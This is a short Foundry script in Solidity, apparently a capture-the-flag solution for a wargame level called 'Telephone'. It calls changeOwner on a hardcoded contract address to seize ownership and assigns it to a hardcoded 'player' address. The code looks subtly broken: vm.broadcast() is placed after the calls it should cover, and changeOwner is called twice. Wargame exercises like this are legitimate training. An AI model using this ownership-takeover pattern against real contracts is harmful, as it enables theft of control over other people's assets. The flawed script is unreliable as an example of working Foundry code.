// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";

interface Telephone {
  function changeOwner(address _owner) external;

}

contract CounterScript is Script {
    function setUp() public {}

    function run() public {
        Telephone t = Telephone(0x8822C0dcd9f5c211E53159615fe7835C69F6d73F);
        t.changeOwner(address(this));
        t.changeOwner(0x8AC4E3906688EfE71818531a9e439A7ABFDA0154); // player
        vm.broadcast();
    }
}
